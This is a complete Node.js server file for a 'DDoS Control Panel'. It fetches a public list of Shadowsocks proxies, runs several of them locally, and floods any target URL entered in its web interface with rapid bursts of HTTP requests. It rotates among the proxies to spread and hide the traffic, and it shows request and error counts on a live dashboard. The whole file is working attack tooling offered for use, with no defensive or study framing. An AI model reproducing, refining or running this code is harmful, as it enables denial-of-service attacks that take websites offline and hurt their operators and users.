// server.js - Production-ready DDoS Panel with Shadowsocks Proxies
const fastify = require('fastify')({ logger: false, disableRequestLogging: true });
const ss = require('shadowsocks');
const { SocksProxyAgent } = require('socks-proxy-agent');
const axios = require('axios');

// ========== CONFIGURATION ==========
const PROXY_LIST_URL = 'https://raw.githubusercontent.com/render12345api/svr/main/ss_working.txt';
const MAX_PROXIES = 8;               // Number of concurrent Shadowsocks instances
const REQS_PER_BURST = 100;           // Requests per burst (per proxy)
const BURST_INTERVAL = 10;             // ms between bursts
const REFRESH_INTERVAL = 15 * 60 * 1000; // 15 minutes
const MAX_ERROR_LOG = 20;              // Number of errors to keep in memory

// ========== STATE ==========
let proxyConfigs = [];                 // All parsed valid configs from the list
let proxyServers = [];                 // Running Shadowsocks server instances
let socksAgents = [];                  // SOCKS agents for each proxy
let currentProxyIndex = 0;              // Round-robin index
let attackActive = false;
let attackStats = { requests: 0, errors: 0 };
let errorLog = [];                      // Array of recent errors for display

// ========== PROXY MANAGEMENT ==========

/**
 * Decode a base64 string safely (handles URL-safe variants and padding)
 */
function decodeBase64Safe(str) {
    try {
        let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
        while (base64.length % 4) base64 += '=';
        return Buffer.from(base64, 'base64').toString();
    } catch {
        return null;
    }
}

/**
 * Parse a single ss:// line into a config object { method, password, server, port }
 * Supports:
 *   - Standard format: ss://base64(method:password)@server:port
 *   - Base64-encoded JSON configs (eyJ...)
 *   - Percent-encoded URLs
 */
function parseSS(url) {
    try {
        let cleanUrl = url.split('#')[0].trim();
        try { cleanUrl = decodeURIComponent(cleanUrl); } catch {}

        // Case 1: standard ss://base64(method:password)@server:port
        const match = cleanUrl.match(/^ss:\/\/([^@]+)@([^:]+):(\d+)/);
        if (match) {
            const encoded = match[1];
            const server = match[2];
            const port = parseInt(match[3], 10);
            const decoded = decodeBase64Safe(encoded);
            if (decoded) {
                const [method, password] = decoded.split(':');
                if (method && password) {
                    return { method, password, server, port };
                }
            }
        }

        // Case 2: base64-encoded JSON config (starts with eyJ...)
        const jsonMatch = cleanUrl.match(/ss:\/\/(eyJ[a-zA-Z0-9+/=_-]+)/);
        if (jsonMatch) {
            const decoded = decodeBase64Safe(jsonMatch[1]);
            if (decoded) {
                try {
                    const config = JSON.parse(decoded);
                    // Handle different field names (add, server, host)
                    const server = config.add || config.server || config.host;
                    const port = config.port;
                    const method = config.method;
                    const password = config.password;
                    if (server && port && method && password) {
                        return { method, password, server, port: parseInt(port, 10) };
                    }
                } catch {}
            }
        }
        return null;
    } catch {
        return null;
    }
}

/**
 * List of encryption methods supported by the 'shadowsocks' library.
 * (Based on the library's source – you can add more if needed.)
 */
const SUPPORTED_METHODS = [
    'aes-128-cfb', 'aes-192-cfb', 'aes-256-cfb',
    'aes-128-ctr', 'aes-192-ctr', 'aes-256-ctr',
    'aes-128-gcm', 'aes-192-gcm', 'aes-256-gcm',
    'chacha20', 'chacha20-ietf', 'chacha20-ietf-poly1305',
    'rc4-md5', 'bf-cfb', 'cast5-cfb', 'des-cfb',
    'camellia-128-cfb', 'camellia-192-cfb', 'camellia-256-cfb',
    'salsa20', 'salsa20-ctr'
];

/**
 * Fetch the proxy list from the remote URL, parse each line, and return an array of valid configs.
 */
async function fetchProxyConfigs() {
    try {
        console.log('Fetching proxy list...');
        const response = await axios.get(PROXY_LIST_URL, { timeout: 10000 });
        const lines = response.data.split('\n');
        const configs = [];
        for (const line of lines) {
            if (line.includes('ss://')) {
                const config = parseSS(line);
                if (config) {
                    // Only keep methods supported by the library
                    if (SUPPORTED_METHODS.includes(config.method)) {
                        configs.push(config);
                        console.log(`✅ Valid: ${config.method}@${config.server}:${config.port}`);
                    } else {
                        console.log(`⚠️ Unsupported method: ${config.method}`);
                    }
                }
            }
        }
        console.log(`Total valid configs: ${configs.length}`);
        return configs;
    } catch (err) {
        console.error('Failed to fetch proxy list:', err.message);
        return [];
    }
}

/**
 * Start a single Shadowsocks server on a local port.
 * Returns a promise that resolves when the server is listening.
 */
async function startProxyServer(config, localPort) {
    return new Promise((resolve, reject) => {
        try {
            // Validate required fields
            if (!config.method || !config.password || !config.server || !config.port) {
                return reject(new Error('Invalid config (missing fields)'));
            }

            const server = ss.createServer(config);

            server.on('listening', () => {
                console.log(`✅ Proxy ${localPort} -> ${config.server}:${config.port} (${config.method})`);
                resolve(server);
            });

            server.on('error', (err) => {
                console.error(`❌ Proxy ${localPort} error:`, err.message);
                reject(err);
            });

            server.listen(localPort, '127.0.0.1');
        } catch (err) {
            reject(err);
        }
    });
}

/**
 * Start the proxy pool: randomly select up to MAX_PROXIES configs, start them,
 * and create SOCKS agents for each.
 * Returns true if at least one proxy started.
 */
async function startProxyPool() {
    if (proxyConfigs.length === 0) return false;

    // Shuffle and pick a random subset
    const shuffled = [...proxyConfigs].sort(() => 0.5 - Math.random());
    const selected = shuffled.slice(0, MAX_PROXIES);

    proxyServers = [];
    socksAgents = [];
    let basePort = 1080;
    let startedCount = 0;

    for (let i = 0; i < selected.length; i++) {
        const localPort = basePort + i;
        try {
            const server = await startProxyServer(selected[i], localPort);
            proxyServers.push(server);
            socksAgents.push(new SocksProxyAgent(`socks5://127.0.0.1:${localPort}`));
            startedCount++;
        } catch (err) {
            console.error(`Failed to start proxy on port ${localPort}:`, err.message);
        }
    }
    console.log(`Started ${startedCount} proxy servers`);
    return startedCount > 0;
}

/**
 * Stop all running proxy servers.
 */
async function stopProxyPool() {
    for (const server of proxyServers) {
        await new Promise((resolve) => server.close(resolve));
    }
    proxyServers = [];
    socksAgents = [];
    currentProxyIndex = 0;
    console.log('All proxies stopped');
}

// ========== ERROR LOGGING ==========
function addErrorLog(target, error, proxyInfo = '') {
    const entry = {
        time: new Date().toISOString(),
        target,
        error: error.message || String(error),
        proxy: proxyInfo
    };
    errorLog.unshift(entry);
    if (errorLog.length > MAX_ERROR_LOG) errorLog.pop();
    console.error('Request error:', entry);
}

// ========== ATTACK ENGINE ==========
async function runAttack(target, duration) {
    const endTime = Date.now() + duration * 1000;
    console.log(`Attack started on ${target} for ${duration}s`);

    while (attackActive && Date.now() < endTime) {
        for (let i = 0; i < REQS_PER_BURST; i++) {
            if (!attackActive || socksAgents.length === 0) break;

            const agentIndex = currentProxyIndex % socksAgents.length;
            const agent = socksAgents[agentIndex];
            currentProxyIndex++;

            const proxyUrl = agent.proxy?.href || 'unknown';

            axios.get(target, {
                httpAgent: agent,
                httpsAgent: agent,
                timeout: 10000
            }).catch((err) => {
                attackStats.errors++;
                addErrorLog(target, err, proxyUrl);
            }).finally(() => {
                attackStats.requests++;
            });
        }
        await new Promise(r => setTimeout(r, BURST_INTERVAL));
    }

    attackActive = false;
    await stopProxyPool();
    console.log('Attack finished');
}

// ========== WEB INTERFACE ==========
const html = `<!DOCTYPE html>
<html>
<head>
    <title>DDoS Control Panel</title>
    <style>
        body { background: white; font-family: Arial, sans-serif; margin: 20px; color: #333; }
        .container { max-width: 1200px; margin: auto; }
        h1 { text-align: center; color: #222; margin-bottom: 30px; }
        .card { border: 1px solid #ccc; padding: 20px; border-radius: 8px; margin-bottom: 20px; background: #f9f9f9; }
        label { display: block; margin: 10px 0 5px; font-weight: bold; }
        input { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        .button-group { display: flex; gap: 10px; margin: 15px 0; }
        button { flex: 1; padding: 12px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        #startBtn { background: #28a745; color: white; }
        #startBtn:hover { background: #218838; }
        #stopBtn { background: #dc3545; color: white; }
        #stopBtn:hover { background: #c82333; }
        .status { padding: 15px; background: #e9ecef; border-radius: 4px; margin: 15px 0; font-size: 18px; text-align: center; }
        .stats { display: flex; justify-content: space-around; margin: 20px 0; }
        .stat-box { text-align: center; background: white; padding: 10px; border-radius: 4px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 30%; }
        .stat-value { font-size: 32px; font-weight: bold; color: #007bff; }
        .stat-label { font-size: 14px; color: #666; }
        .error-log { background: #1e1e1e; color: #f8f8f8; padding: 15px; border-radius: 4px; font-family: monospace; max-height: 400px; overflow-y: auto; font-size: 12px; }
        .error-entry { border-bottom: 1px solid #444; padding: 8px 0; }
        .error-time { color: #888; }
        .error-target { color: #ffa500; }
        .error-msg { color: #ff6b6b; white-space: pre-wrap; word-break: break-word; }
        .footer { text-align: center; font-size: 12px; color: #999; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>DDoS Control Panel</h1>

        <div class="card">
            <div class="status" id="status">Online</div>

            <div class="stats">
                <div class="stat-box">
                    <div class="stat-value" id="reqCount">0</div>
                    <div class="stat-label">Requests</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="errCount">0</div>
                    <div class="stat-label">Errors</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="proxyCount">0</div>
                    <div class="stat-label">Proxies</div>
                </div>
            </div>

            <label for="target">Target URL (http:// or https://)</label>
            <input type="url" id="target" placeholder="https://example.com" required>

            <label for="duration">Duration (seconds)</label>
            <input type="number" id="duration" value="60" min="1" max="3600">

            <div class="button-group">
                <button id="startBtn">START ATTACK</button>
                <button id="stopBtn">STOP ATTACK</button>
            </div>

            <div class="footer">
                Using refined proxies from: ss_working.txt (refreshed every 15 min)
            </div>
        </div>

        <div class="card">
            <h3>Error Log (last ${MAX_ERROR_LOG})</h3>
            <div class="error-log" id="errorLog">
                <div class="error-entry">No errors yet</div>
            </div>
        </div>
    </div>

    <script>
        async function updateStatus() {
            try {
                const res = await fetch('/status');
                const data = await res.json();
                document.getElementById('status').innerText = data.running ? 'Attacking' : 'Online';
                document.getElementById('reqCount').innerText = data.stats.requests;
                document.getElementById('errCount').innerText = data.stats.errors;
                document.getElementById('proxyCount').innerText = data.proxies;

                // Update error log
                if (data.errorLog && data.errorLog.length > 0) {
                    const logEl = document.getElementById('errorLog');
                    logEl.innerHTML = data.errorLog.map(e => 
                        \`<div class="error-entry">
                            <span class="error-time">\${e.time}</span> 
                            <span class="error-target">\${e.target}</span><br>
                            <span class="error-msg">\${e.error}</span>
                        </div>\`
                    ).join('');
                } else {
                    document.getElementById('errorLog').innerHTML = '<div class="error-entry">No errors yet</div>';
                }
            } catch (err) {
                console.error('Status update error:', err);
            }
        }

        async function startAttack() {
            const target = document.getElementById('target').value;
            const duration = parseInt(document.getElementById('duration').value);
            if (!target) return alert('Please enter a target URL');

            try {
                const res = await fetch('/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ target, duration })
                });
                const data = await res.json();
                if (!data.success) alert('Error: ' + data.error);
                else updateStatus();
            } catch (err) {
                alert('Network error: ' + err.message);
            }
        }

        async function stopAttack() {
            try {
                const res = await fetch('/stop', { method: 'POST' });
                const data = await res.json();
                if (!data.success) alert('Error: ' + data.error);
                else updateStatus();
            } catch (err) {
                alert('Network error: ' + err.message);
            }
        }

        document.getElementById('startBtn').addEventListener('click', startAttack);
        document.getElementById('stopBtn').addEventListener('click', stopAttack);
        setInterval(updateStatus, 1000);
        updateStatus();
    </script>
</body>
</html>
`;

// ========== FASTIFY ROUTES ==========
fastify.get('/', (req, reply) => {
    reply.header('Content-Type', 'text/html; charset=utf-8').send(html);
});

fastify.get('/status', (req, reply) => {
    reply.send({
        running: attackActive,
        stats: attackStats,
        proxies: socksAgents.length,
        errorLog
    });
});

fastify.post('/start', async (req, reply) => {
    try {
        const { target, duration } = req.body;
        if (!target || !duration) {
            return reply.status(400).send({ success: false, error: 'Missing target or duration' });
        }

        // Stop any ongoing attack
        attackActive = false;
        await stopProxyPool();

        // Ensure we have proxies (fetch if empty)
        if (proxyConfigs.length === 0) {
            proxyConfigs = await fetchProxyConfigs();
        }
        if (proxyConfigs.length === 0) {
            return reply.status(500).send({ success: false, error: 'No proxies available' });
        }

        // Start proxy pool
        const started = await startProxyPool();
        if (!started) {
            return reply.status(500).send({ success: false, error: 'Failed to start any proxy' });
        }

        // Reset stats and error log
        attackStats = { requests: 0, errors: 0 };
        errorLog = [];
        attackActive = true;

        // Run attack asynchronously (don't await)
        runAttack(target, duration).catch(console.error);

        reply.send({ success: true });
    } catch (err) {
        console.error('Unhandled error in /start:', err);
        reply.status(500).send({ success: false, error: err.message });
    }
});

fastify.post('/stop', async (req, reply) => {
    try {
        attackActive = false;
        await stopProxyPool();
        reply.send({ success: true });
    } catch (err) {
        console.error('Unhandled error in /stop:', err);
        reply.status(500).send({ success: false, error: err.message });
    }
});

// Global error handler
fastify.setErrorHandler((error, req, reply) => {
    console.error('Fastify error:', error);
    reply.status(500).send({ success: false, error: error.message });
});

// Handle uncaught exceptions (prevent crash)
process.on('uncaughtException', (err) => {
    console.error('UNCAUGHT EXCEPTION:', err);
});

process.on('unhandledRejection', (err) => {
    console.error('UNHANDLED REJECTION:', err);
});

// ========== INIT ==========
async function init() {
    proxyConfigs = await fetchProxyConfigs();

    // Background refresh every 15 minutes
    setInterval(async () => {
        console.log('Refreshing proxy list...');
        const newConfigs = await fetchProxyConfigs();
        if (newConfigs.length > 0) {
            proxyConfigs = newConfigs;
            console.log('Proxy list refreshed (background)');
        }
    }, REFRESH_INTERVAL);

    const port = process.env.PORT || 5000;
    fastify.listen({ port, host: '0.0.0.0' }, (err) => {
        if (err) {
            console.error('Failed to start server:', err);
            process.exit(1);
        }
        console.log(`Panel running on port ${port}`);
    });
}

init();
